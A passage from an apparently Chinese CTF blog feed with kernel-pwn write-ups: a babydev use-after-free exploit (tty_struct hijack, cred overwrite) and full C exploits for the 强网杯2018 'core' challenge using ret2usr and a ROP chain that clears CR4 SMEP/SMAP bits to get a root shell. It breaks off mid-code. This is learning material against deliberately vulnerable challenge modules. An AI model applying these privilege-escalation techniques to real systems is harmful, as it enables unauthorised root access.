class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br><br><span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>); <span class="hljs-comment">//tty_struct size 0x2e0</span><br>close(fd1);<br><br><span class="hljs-type">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br><span class="hljs-type">int</span> fd3=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,<span class="hljs-number">2</span>);<br><br>read(fd2,fake_tty,<span class="hljs-number">0x20</span>);<br>fake_tty[<span class="hljs-number">3</span>]=fake_op;<br>write(fd2, fake_tty, <span class="hljs-number">0x20</span>);<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>write(fd3, buf, <span class="hljs-number">0x8</span>);<span class="hljs-comment">//trigger</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>成功提权</p><p><img src="/2022/11/10/0x04kernelUAF/9.png" alt="9"></p><h3 id="0x03解法2：">0x03解法2：</h3><p><strong>大体步骤：UAF-&gt;修改cred</strong></p><p>新版本内核就不能用过去的简单做法了，因为：</p><blockquote><p>新进程的cred结构体会有一个单独的区域进行申请，因此UAF漏洞无法利用成功，这种新的特征叫做lockdown</p></blockquote><p>此外我的gcc编译出来的打不通(用wiki里给的打的通，也许是编译器问题)，懒得整了</p><h4 id="1-exp：">1.exp：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//gcc uaf.c -static -o uaf</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br><br>    ioctl(fd1,<span class="hljs-number">0x10001</span>,<span class="hljs-number">0xa8</span>);<br>    close(fd1);<br>    <br>    <span class="hljs-type">int</span> pid=fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> zeros[<span class="hljs-number">40</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2,zeros,<span class="hljs-number">32</span>);<br>    <br>        <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]get root&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>    &#125;<br>    close(fd2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernelUAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x03 kernel ROP-Ret2usr&amp;pass-SMEP</title>
    <link href="/2022/11/08/0x03kenelRet2usr/"/>
    <url>/2022/11/08/0x03kenelRet2usr/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>参考<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/ret2usr/">wiki</a>，<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x02-Kernel-ROP-ret2usr">arttnba3</a></p><p>ret2usr 攻击利用了 <strong>用户空间的进程不能访问内核空间，但内核空间能访问用户空间</strong> 这个特性来定向内核代码或数据流指向用户控件，以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作</p><p>虽然为了防止ret2usr，开发者加了smep保护（Supervisor Mode Execution Protection），作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误；但是也有对应绕过方法</p><h2 id="NO-SMEP-SMAP：">NO SMEP/SMAP：</h2><h3 id="强网杯2018-core">强网杯2018-core</h3><p>还是以这题为例，这题qemu启动时没开启smep，除了kernel rop另一种解法就是ret2usr</p><h4 id="0x01差别">0x01差别</h4><p>可以看到，从原本的rop出<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code>变为了直接在内核态调用用户态的<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code></p><p>因为内核态可以以 <code>ring 0</code> 特权执行用户空间代码</p><h4 id="0x02exp">0x02exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BYPASS-SMEP-SMAP">BYPASS SMEP/SMAP:</h2><h3 id="强网杯2018-core-2">强网杯2018-core</h3><h4 id="0x01分析">0x01分析</h4><p>还是以这题为例</p><p>往start.sh加上smap,smep保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-cpu qemu64-v1,+smep,+smap \<br></code></pre></td></tr></table></figure><p>再次运行get_root脚本发现内核报错重启了，因为smep保护,在内核态用户态的代码不可执行</p><p><img src="/2022/11/08/0x03kenelRet2usr/1.png" alt="1"></p><p>内核根据cr4寄存器的第20,21位的值来判断smep保护和smap保护是否开启</p><p>（偷一张图）</p><p><img src="/2022/11/08/0x03kenelRet2usr/cr4.png" alt="cr4"></p><p>我们可以通过ROP把smep和smap位置为0，就关掉了保护</p><p><strong>解释下面这一串rop链：</strong></p><p>就是把cr4寄存器赋值给rax</p><p>我们接着把rdi寄存器赋值0xffffffffffcfffff</p><p>rax和rdi寄存器按位与就刚好把20，21位的值变为0了</p><p>相当于把保护关了</p><p>然后我们就可以用<code>(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));</code>去提权了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br></code></pre></td></tr></table></figure><h4 id="0x02exp-2">0x02exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc bypass.c -static -masm=intel -g -o bypass</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            